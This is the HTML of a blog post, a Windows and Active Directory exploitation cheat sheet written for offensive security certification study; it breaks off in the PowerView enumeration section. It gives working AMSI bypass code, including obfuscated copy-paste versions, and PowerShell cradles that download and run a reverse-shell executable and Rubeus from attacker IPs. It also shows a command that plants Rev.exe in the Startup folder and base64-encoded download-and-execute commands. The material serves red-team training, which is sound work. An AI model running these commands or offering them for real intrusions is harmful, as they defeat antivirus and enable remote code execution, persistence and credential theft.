<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="map[name:Cas van Cooten]"><meta name=description content="Last update: November 3rd, 2021
Updated November 3rd, 2021: Included several fixes and actualized some techniques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rubeus, and Mimikatz sections. Fixed some whoopsies as well ðŸ™ƒ.
Updated June 5th, 2021: I have made some more changes to this post based on (among others) techniques discussed in ZeroPointSecurity&rsquo;s &lsquo;Red Team Ops&rsquo; course (for the CRTO certification). I&rsquo;ve re-written and improved many sections. New sections have been added on DPAPI and GPO abuse. Notable changes have been made to the the sections on LAPS, AppLocker & CLM, PowerView, and Overpass-the-Hash with Rubeus. Enjoy! :)
"><meta name=keywords content="homepage,blog,cas van cooten,security,hacking,Active Directory,Windows,Hacking"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://casvancooten.com/pr-preview/pr-2/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/><title>Windows & Active Directory Exploitation Cheat Sheet and Command Reference :: Cas van Cooten
</title><link rel=stylesheet href=/pr-preview/pr-2/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css integrity="sha256-JEGDzeGjjgsI+CwReRGBKI+arBzJYYzW9OnncQxXaLo=" crossorigin=anonymous><link rel=apple-touch-icon sizes=180x180 href=/pr-preview/pr-2/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/pr-preview/pr-2/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/pr-preview/pr-2/favicon-16x16.png><link rel=manifest href=/pr-preview/pr-2/site.webmanifest><link rel=mask-icon href=/pr-preview/pr-2/safari-pinned-tab.svg color><link rel="shortcut icon" href=/pr-preview/pr-2/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Windows & Active Directory Exploitation Cheat Sheet and Command Reference"><meta itemprop=description content="Last update: November 3rd, 2021
Updated November 3rd, 2021: Included several fixes and actualized some techniques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rubeus, and Mimikatz sections. Fixed some whoopsies as well ðŸ™ƒ.
Updated June 5th, 2021: I have made some more changes to this post based on (among others) techniques discussed in ZeroPointSecurityâ€™s â€˜Red Team Opsâ€™ course (for the CRTO certification). Iâ€™ve re-written and improved many sections. New sections have been added on DPAPI and GPO abuse. Notable changes have been made to the the sections on LAPS, AppLocker & CLM, PowerView, and Overpass-the-Hash with Rubeus. Enjoy! :)"><meta itemprop=datePublished content="2020-11-04T00:00:00+00:00"><meta itemprop=dateModified content="2023-08-10T12:03:26+02:00"><meta itemprop=wordCount content="6475"><meta itemprop=image content="https://casvancooten.com/preview.png"><meta itemprop=keywords content="Active Directory,Windows,Hacking"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://casvancooten.com/preview.png"><meta name=twitter:title content="Windows & Active Directory Exploitation Cheat Sheet and Command Reference"><meta name=twitter:description content="Last update: November 3rd, 2021
Updated November 3rd, 2021: Included several fixes and actualized some techniques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rubeus, and Mimikatz sections. Fixed some whoopsies as well ðŸ™ƒ.
Updated June 5th, 2021: I have made some more changes to this post based on (among others) techniques discussed in ZeroPointSecurityâ€™s â€˜Red Team Opsâ€™ course (for the CRTO certification). Iâ€™ve re-written and improved many sections. New sections have been added on DPAPI and GPO abuse. Notable changes have been made to the the sections on LAPS, AppLocker & CLM, PowerView, and Overpass-the-Hash with Rubeus. Enjoy! :)"><meta property="og:url" content="https://casvancooten.com/pr-preview/pr-2/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/"><meta property="og:site_name" content="Cas van Cooten"><meta property="og:title" content="Windows & Active Directory Exploitation Cheat Sheet and Command Reference"><meta property="og:description" content="Last update: November 3rd, 2021
Updated November 3rd, 2021: Included several fixes and actualized some techniques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rubeus, and Mimikatz sections. Fixed some whoopsies as well ðŸ™ƒ.
Updated June 5th, 2021: I have made some more changes to this post based on (among others) techniques discussed in ZeroPointSecurityâ€™s â€˜Red Team Opsâ€™ course (for the CRTO certification). Iâ€™ve re-written and improved many sections. New sections have been added on DPAPI and GPO abuse. Notable changes have been made to the the sections on LAPS, AppLocker & CLM, PowerView, and Overpass-the-Hash with Rubeus. Enjoy! :)"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-04T00:00:00+00:00"><meta property="article:modified_time" content="2023-08-10T12:03:26+02:00"><meta property="article:tag" content="Active Directory"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Hacking"><meta property="og:image" content="https://casvancooten.com/preview.png"><meta property="og:see_also" content="https://casvancooten.com/pr-preview/pr-2/posts/2020/05/oscp-cheat-sheet-and-command-reference/"><meta property="article:published_time" content="2020-11-04 00:00:00 +0000 UTC"></head><body><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>Security Ramblings</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=/pr-preview/pr-2/about/>About</a></li><li><a href=/pr-preview/pr-2/posts/>Blog</a></li></ul></nav><span class=menu-trigger><svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
31 minutes</p></div><article><h1 class=post-title><a href=https://casvancooten.com/pr-preview/pr-2/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/>Windows & Active Directory Exploitation Cheat Sheet and Command Reference</a></h1><hr><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents><ul><li><a href=#general>General</a><ul><li><a href=#powershell-amsi-bypass>PowerShell AMSI Bypass</a></li><li><a href=#powershell-one-liners>PowerShell one-liners</a></li></ul></li><li><a href=#enumeration>Enumeration</a><ul><li><a href=#ad-enumeration-with-powerview>AD Enumeration With PowerView</a></li><li><a href=#applocker>AppLocker</a></li><li><a href=#powershell-constrained-language-mode>PowerShell Constrained Language Mode</a></li><li><a href=#laps>LAPS</a></li></ul></li><li><a href=#lateral-movement>Lateral Movement</a><ul><li><a href=#lateral-movement-enumeration-with-powerview>Lateral Movement Enumeration With PowerView</a></li><li><a href=#bloodhound>BloodHound</a></li><li><a href=#kerberoasting>Kerberoasting</a></li><li><a href=#as-rep-roasting>AS-REP roasting</a></li><li><a href=#token-manipulation>Token Manipulation</a></li><li><a href=#lateral-movement-with-rubeus>Lateral Movement with Rubeus</a></li><li><a href=#lateral-movement-with-mimikatz>Lateral Movement with Mimikatz</a></li><li><a href=#command-execution-with-scheduled-tasks>Command execution with scheduled tasks</a></li><li><a href=#command-execution-with-wmi>Command execution with WMI</a></li><li><a href=#command-execution-with-powershell-remoting>Command execution with PowerShell Remoting</a></li><li><a href=#unconstrained-delegation>Unconstrained delegation</a></li><li><a href=#constrained-delegation>Constrained delegation</a></li><li><a href=#resource-based-constrained-delegation>Resource-based constrained delegation</a></li><li><a href=#abusing-domain-trust>Abusing domain trust</a></li><li><a href=#abusing-inter-forest-trust>Abusing inter-forest trust</a></li><li><a href=#abusing-mssql-databases-for-lateral-movement>Abusing MSSQL databases for lateral movement</a></li><li><a href=#abusing-group-policy-objects-for-lateral-movement>Abusing Group Policy Objects for lateral movement</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#powerup>PowerUp</a></li><li><a href=#uac-bypass>UAC Bypass</a></li></ul></li><li><a href=#persistence>Persistence</a><ul><li><a href=#startup-folder>Startup folder</a></li></ul></li><li><a href=#domain-persistence>Domain Persistence</a><ul><li><a href=#mimikatz-skeleton-key-attack>Mimikatz skeleton key attack</a></li><li><a href=#grant-specific-user-dcsync-rights-with-powerview>Grant specific user DCSync rights with PowerView</a></li><li><a href=#domain-controller-dsrm-admin>Domain Controller DSRM admin</a></li><li><a href=#modifying-security-descriptors-for-remote-wmi-access>Modifying security descriptors for remote WMI access</a></li><li><a href=#modifying-security-descriptors-for-powershell-remoting-access>Modifying security descriptors for PowerShell Remoting access</a></li><li><a href=#modifying-dc-registry-security-descriptors-for-remote-hash-retrieval-using-damp>Modifying DC registry security descriptors for remote hash retrieval using DAMP</a></li><li><a href=#dcshadow>DCShadow</a></li></ul></li><li><a href=#post-exploitation>Post-Exploitation</a><ul><li><a href=#lsass-protection>LSASS protection</a></li><li><a href=#dumping-os-credentials-with-mimikatz>Dumping OS credentials with Mimikatz</a></li><li><a href=#abusing-the-data-protection-api-dpapi-with-mimikatz>Abusing the Data Protection API (DPAPI) with Mimikatz</a></li><li><a href=#dumping-secrets-without-mimikatz>Dumping secrets without Mimikatz</a></li><li><a href=#windows-defender-evasion>Windows Defender evasion</a></li><li><a href=#chisel-proxying>Chisel proxying</a></li><li><a href=#juicy-files>Juicy files</a></li></ul></li></ul></nav></aside><hr><div class=post-content><p><em>Last update: <strong>November 3rd, 2021</strong></em></p><p><em>Updated <strong>November 3rd, 2021</strong>: Included several fixes and actualized some techniques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rubeus, and Mimikatz sections. Fixed some whoopsies as well</em> ðŸ™ƒ.</p><p><em>Updated <strong>June 5th, 2021</strong>: I have made some more changes to this post based on (among others) techniques discussed in ZeroPointSecurity&rsquo;s &lsquo;Red Team Ops&rsquo; course (for the CRTO certification). I&rsquo;ve re-written and improved many sections. New sections have been added on DPAPI and GPO abuse. Notable changes have been made to the the sections on LAPS, AppLocker & CLM, PowerView, and Overpass-the-Hash with Rubeus. Enjoy! :)</em></p><p><em>Updated <strong>March 26th, 2021</strong>: This blog post has been updated based on some tools and techniques from Offensive Security&rsquo;s PEN-300 course (for the accompanying OSEP certification). Notable changes have been made in the sections on delegation, inter-forest exploitation, and lateral movement through MSSQL servers. Some other changes and clarifications have been made throughout the post.</em></p><p>Since I recently completed my CRTP and CRTE exams, I decided to compile a list of my most-used techniques and commands for Microsoft Windows and Active Directory (post-)exploitation. It is largely aimed at completing these two certifications, but should be useful in a lot of cases when dealing with Windows / AD exploitation.</p><p>That being said - it is <em>far from</em> an exhaustive list. If you feel any important tips, tricks, commands or techniques are missing from this list just get in touch. I will try to keep it updated as much as possible!</p><p>Many items of this list are shamelessly stolen from certification courses (that come highly recommended) that discuss Active Directory, such as <a href=https://www.alteredsecurity.com/adlab>CRTP</a>, <a href=https://www.alteredsecurity.com/redteamlab>CRTE</a>, <a href=https://www.offensive-security.com/pen300-osep/>OSEP</a>, and <a href=https://www.zeropointsecurity.co.uk/red-team-ops>CRTO</a>.
If you are looking for the cheat sheet and command reference I used for OSCP, please refer to <a href=https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/>this post</a>.</p><p><em>Note: I tried to highlight some poor OpSec choices for typical red teaming engagements with ðŸš©. I will likely have missed some though, so make sure you <strong>understand what you are running</strong> before you run it!</em></p><h2 id=general>General</h2><h3 id=powershell-amsi-bypass>PowerShell AMSI Bypass</h3><p>Patching the Anti-Malware Scan Interface (AMSI) will help bypass AV warnings triggered when executing PowerShell scripts (or other AMSI-enabled content, such as JScript) that are marked as malicious. Do not use as-is in covert operations, as they will get flagged ðŸš©. Obfuscate, or even better, eliminate the need for an AMSI bypass altogether by altering your scripts to beat signature-based detection.</p><p>&lsquo;Plain&rsquo; AMSI bypass example:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>[<span style=color:#40ffff>Ref</span>].Assembly.GetType(<span style=color:#ed9d13>&#39;System.Management.Automation.AmsiUtils&#39;</span>).GetField(<span style=color:#ed9d13>&#39;amsiInitFailed&#39;</span>,<span style=color:#ed9d13>&#39;NonPublic,Static&#39;</span>).SetValue($null,$true)
</span></span></code></pre></div><p>Obfuscation example for copy-paste purposes:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>sET-ItEM</span> ( <span style=color:#ed9d13>&#39;V&#39;</span>+<span style=color:#ed9d13>&#39;aR&#39;</span> +  <span style=color:#ed9d13>&#39;IA&#39;</span> + <span style=color:#ed9d13>&#39;blE:1q2&#39;</span>  + <span style=color:#ed9d13>&#39;uZx&#39;</span>  ) ( [<span style=color:#40ffff>TYpE</span>](  <span style=color:#ed9d13>&#34;{1}{0}&#34;</span>-F<span style=color:#ed9d13>&#39;F&#39;</span>,<span style=color:#ed9d13>&#39;rE&#39;</span>  ) )  ;    (    <span style=color:#24909d>GeT-VariaBle</span>  ( <span style=color:#ed9d13>&#34;1Q2U&#34;</span>  +<span style=color:#ed9d13>&#34;zX&#34;</span>  )  -VaL ).<span style=color:#ed9d13>&#34;A`ss`Embly&#34;</span>.<span style=color:#ed9d13>&#34;GET</span><span style=color:#ed9d13>`T</span><span style=color:#ed9d13>Y`Pe&#34;</span>((  <span style=color:#ed9d13>&#34;{6}{3}{1}{4}{2}{0}{5}&#34;</span> -f<span style=color:#ed9d13>&#39;Util&#39;</span>,<span style=color:#ed9d13>&#39;A&#39;</span>,<span style=color:#ed9d13>&#39;Amsi&#39;</span>,<span style=color:#ed9d13>&#39;.Management.&#39;</span>,<span style=color:#ed9d13>&#39;utomation.&#39;</span>,<span style=color:#ed9d13>&#39;s&#39;</span>,<span style=color:#ed9d13>&#39;System&#39;</span>  ) ).<span style=color:#ed9d13>&#34;g`etf`iElD&#34;</span>(  ( <span style=color:#ed9d13>&#34;{0}{2}{1}&#34;</span> -f<span style=color:#ed9d13>&#39;amsi&#39;</span>,<span style=color:#ed9d13>&#39;d&#39;</span>,<span style=color:#ed9d13>&#39;InitFaile&#39;</span>  ),(  <span style=color:#ed9d13>&#34;{2}{4}{0}{1}{3}&#34;</span> -f <span style=color:#ed9d13>&#39;Stat&#39;</span>,<span style=color:#ed9d13>&#39;i&#39;</span>,<span style=color:#ed9d13>&#39;NonPubli&#39;</span>,<span style=color:#ed9d13>&#39;c&#39;</span>,<span style=color:#ed9d13>&#39;c,&#39;</span> )).<span style=color:#ed9d13>&#34;sE</span><span style=color:#ed9d13>`T`V</span><span style=color:#ed9d13>aLUE&#34;</span>(  ${n`ULl},${t`RuE} )
</span></span></code></pre></div><p>Another bypass, which is not detected by PowerShell autologging:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>[<span style=color:#40ffff>Delegate</span>]::CreateDelegate((<span style=color:#ed9d13>&#34;Func</span><span style=color:#ed9d13>``</span><span style=color:#ed9d13>3[String, </span>$(([<span style=color:#40ffff>String</span>].Assembly.GetType(<span style=color:#ed9d13>&#39;System.Reflection.Bindin&#39;</span>+<span style=color:#ed9d13>&#39;gFlags&#39;</span>)).FullName)<span style=color:#ed9d13>, System.Reflection.FieldInfo]&#34;</span> -as [<span style=color:#40ffff>String</span>].Assembly.GetType(<span style=color:#ed9d13>&#39;System.T&#39;</span>+<span style=color:#ed9d13>&#39;ype&#39;</span>)), [<span style=color:#40ffff>Object</span>]([<span style=color:#40ffff>Ref</span>].Assembly.GetType(<span style=color:#ed9d13>&#39;System.Management.Automation.AmsiUtils&#39;</span>)),(<span style=color:#ed9d13>&#39;GetFie&#39;</span>+<span style=color:#ed9d13>&#39;ld&#39;</span>)).Invoke(<span style=color:#ed9d13>&#39;amsiInitFailed&#39;</span>,((<span style=color:#ed9d13>&#39;Non&#39;</span>+<span style=color:#ed9d13>&#39;Public,Static&#39;</span>) -as [<span style=color:#40ffff>String</span>].Assembly.GetType(<span style=color:#ed9d13>&#39;System.Reflection.Bindin&#39;</span>+<span style=color:#ed9d13>&#39;gFlags&#39;</span>))).SetValue($null,$True)
</span></span></code></pre></div><blockquote><p>More bypasses <a href=https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>here</a>. For obfuscation, check <a href=https://github.com/danielbohannon/Invoke-Obfuscation>Invoke-Obfuscation</a>, or get a custom-generated obfuscated version at <a href=https:///amsi.fail>amsi.fail</a>.</p></blockquote><h3 id=powershell-one-liners>PowerShell one-liners</h3><h4 id=load-powershell-script-reflectively>Load PowerShell script reflectively</h4><p>Proxy-aware:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>IEX </span>(<span style=color:#24909d>New-Object</span> Net.WebClient).DownloadString(<span style=color:#ed9d13>&#39;http://10.10.16.7/PowerView.obs.ps1&#39;</span>)
</span></span></code></pre></div><p>Non-proxy aware:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#40ffff>$h</span>=<span style=color:#24909d>new-object</span> -com WinHttp.WinHttpRequest.5.<span style=color:#3677a9>1</span>;<span style=color:#40ffff>$h</span>.open(<span style=color:#ed9d13>&#39;GET&#39;</span>,<span style=color:#ed9d13>&#39;http://10.10.16.7/PowerView.obs.ps1&#39;</span>,$false);<span style=color:#40ffff>$h</span>.send();<span style=color:#24909d>iex </span><span style=color:#40ffff>$h</span>.responseText
</span></span></code></pre></div><blockquote><p>Again, this will likely get flagged ðŸš©. For opsec-safe download cradles, check out <a href=https://github.com/danielbohannon/Invoke-CradleCrafter>Invoke-CradleCrafter</a>.</p></blockquote><h4 id=load-c-assembly-reflectively>Load C# assembly reflectively</h4><p>Ensure that the referenced class and main methods are <code>public</code> before running this. Note that a process-wide AMSI bypass may be required for this to work if the content is detected, <a href=https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/>refer here for details</a>.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Download and run assembly without arguments</span>
</span></span><span style=display:flex><span><span style=color:#40ffff>$data</span> = (<span style=color:#24909d>New-Object</span> System.Net.WebClient).DownloadData(<span style=color:#ed9d13>&#39;http://10.10.16.7/rev.exe&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#40ffff>$assem</span> = [<span style=color:#40ffff>System.Reflection.Assembly</span>]::Load(<span style=color:#40ffff>$data</span>)
</span></span><span style=display:flex><span>[<span style=color:#40ffff>rev.Program</span>]::Main()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Download and run Rubeus, with arguments (make sure to split the args)</span>
</span></span><span style=display:flex><span><span style=color:#40ffff>$data</span> = (<span style=color:#24909d>New-Object</span> System.Net.WebClient).DownloadData(<span style=color:#ed9d13>&#39;http://10.10.16.7/Rubeus.exe&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#40ffff>$assem</span> = [<span style=color:#40ffff>System.Reflection.Assembly</span>]::Load(<span style=color:#40ffff>$data</span>)
</span></span><span style=display:flex><span>[<span style=color:#40ffff>Rubeus.Program</span>]::Main(<span style=color:#ed9d13>&#34;s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt&#34;</span>.Split())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Execute a specific method from an assembly (e.g. a DLL)</span>
</span></span><span style=display:flex><span><span style=color:#40ffff>$data</span> = (<span style=color:#24909d>New-Object</span> System.Net.WebClient).DownloadData(<span style=color:#ed9d13>&#39;http://10.10.16.7/lib.dll&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#40ffff>$assem</span> = [<span style=color:#40ffff>System.Reflection.Assembly</span>]::Load(<span style=color:#40ffff>$data</span>)
</span></span><span style=display:flex><span><span style=color:#40ffff>$class</span> = <span style=color:#40ffff>$assem</span>.GetType(<span style=color:#ed9d13>&#34;ClassLibrary1.Class1&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#40ffff>$method</span> = <span style=color:#40ffff>$class</span>.GetMethod(<span style=color:#ed9d13>&#34;runner&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#40ffff>$method</span>.Invoke(<span style=color:#3677a9>0</span>, $null)
</span></span></code></pre></div><h4 id=download-file>Download file</h4><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Any version</span>
</span></span><span style=display:flex><span>(<span style=color:#24909d>New-Object</span> System.Net.WebClient).DownloadFile(<span style=color:#ed9d13>&#34;http://192.168.119.155/PowerUp.ps1&#34;</span>, <span style=color:#ed9d13>&#34;C:\Windows\Temp\PowerUp.ps1&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Powershell 4+</span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic>## You can use &#39;IWR&#39; as a shorthand</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-WebRequest</span> <span style=color:#ed9d13>&#34;http://10.10.16.7/Rev.exe&#34;</span> -OutFile <span style=color:#ed9d13>&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe&#34;</span>
</span></span></code></pre></div><h4 id=encoded-commands>Encoded commands</h4><p>Base64-encode a PowerShell command in the right format:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#40ffff>$command</span> = <span style=color:#ed9d13>&#39;IEX (New-Object Net.WebClient).DownloadString(&#34;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&#34;)&#39;</span>
</span></span><span style=display:flex><span><span style=color:#40ffff>$bytes</span> = [<span style=color:#40ffff>System.Text.Encoding</span>]::Unicode.GetBytes(<span style=color:#40ffff>$command</span>)
</span></span><span style=display:flex><span><span style=color:#40ffff>$encodedCommand</span> = [<span style=color:#40ffff>Convert</span>]::ToBase64String(<span style=color:#40ffff>$bytes</span>)
</span></span></code></pre></div><p>Or, the Linux version of the above:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#24909d>echo</span> <span style=color:#ed9d13>&#39;IEX (New-Object Net.WebClient).DownloadString(&#34;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&#34;)&#39;</span> | iconv -t utf-16le | base64 -w <span style=color:#3677a9>0</span>
</span></span></code></pre></div><p>Encode existing script, copy to clipboard:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>[<span style=color:#40ffff>System.Convert</span>]::ToBase64String([<span style=color:#40ffff>System.IO.File</span>]::ReadAllBytes(<span style=color:#ed9d13>&#39;c:\path\to\PowerView.ps1&#39;</span>)) | clip
</span></span></code></pre></div><p>Run it, bypassing execution policy.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Powershell -EncodedCommand <span style=color:#40ffff>$encodedCommand</span>
</span></span></code></pre></div><blockquote><p>If you have Nishang handy, you can use <a href=https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1>Invoke-Encode.ps1</a>.</p></blockquote><h2 id=enumeration>Enumeration</h2><h3 id=ad-enumeration-with-powerview>AD Enumeration With PowerView</h3><p>Though the below gives a good representation of the commands that usually come in most useful for me, this only scratches the surface of what PowerView can do. PowerView is available <a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>here</a>.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Get all users in the current domain</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainUser</span> | <span style=color:#24909d>select </span>-ExpandProperty cn
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get all computers in the current domain</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainComputer</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get all domains in current forest</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-ForestDomain</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get domain/forest trusts</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainTrust</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-ForestTrust</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get information for the DA group</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainGroup</span> <span style=color:#ed9d13>&#34;Domain Admins&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Find members of the DA group</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainGroupMember</span> <span style=color:#ed9d13>&#34;Domain Admins&#34;</span> | <span style=color:#24909d>select </span>-ExpandProperty membername
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Find interesting shares in the domain, ignore default shares, and check access</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Find-DomainShare</span> -ExcludeStandard -ExcludePrint -ExcludeIPC -CheckShareAccess
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get OUs for current domain</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainOU</span> -FullData
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get computers in an OU</span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># %{} is a looping statement</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainOU</span> -name Servers | %{ <span style=color:#24909d>Get-DomainComputer</span> -SearchBase <span style=color:#40ffff>$_</span>.distinguishedname } | <span style=color:#24909d>select </span>dnshostname
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get GPOs applied to a specific OU</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainOU</span> *WS* | <span style=color:#24909d>select </span>gplink
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainGPO</span> -Name <span style=color:#ed9d13>&#34;{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get Restricted Groups set via GPOs, look for interesting group memberships forced via domain</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainGPOLocalGroup</span> -ResolveMembersToSIDs | <span style=color:#24909d>select </span>GPODisplayName, GroupName, GroupMemberOf, GroupMembers
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get the computers where users are part of a local group through a GPO restricted group</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainGPOUserLocalGroupMapping</span> -LocalGroup Administrators | <span style=color:#24909d>select </span>ObjectName, GPODisplayName, ContainerName, ComputerName
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Find principals that can create new GPOs in the domain</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainObjectAcl</span> -SearchBase <span style=color:#ed9d13>&#34;CN=Policies,CN=System,DC=targetdomain,DC=com&#34;</span> -ResolveGUIDs | ?{ <span style=color:#40ffff>$_</span>.ObjectAceType -eq <span style=color:#ed9d13>&#34;Group-Policy-Container&#34;</span> } | <span style=color:#24909d>select </span>ObjectDN, ActiveDirectoryRights, SecurityIdentifier
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Find principals that can link GPOs to OUs</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainOU</span> | <span style=color:#24909d>Get-DomainObjectAcl</span> -ResolveGUIDs | ? { <span style=color:#40ffff>$_</span>.ObjectAceType -eq <span style=color:#ed9d13>&#34;GP-Link&#34;</span> -and <span style=color:#40ffff>$_</span>.ActiveDirectoryRights -match <span style=color:#ed9d13>&#34;WriteProperty&#34;</span> } | <span style=color:#24909d>select </span>ObjectDN, SecurityIdentifier
</span></span><span style=display:flex><span>
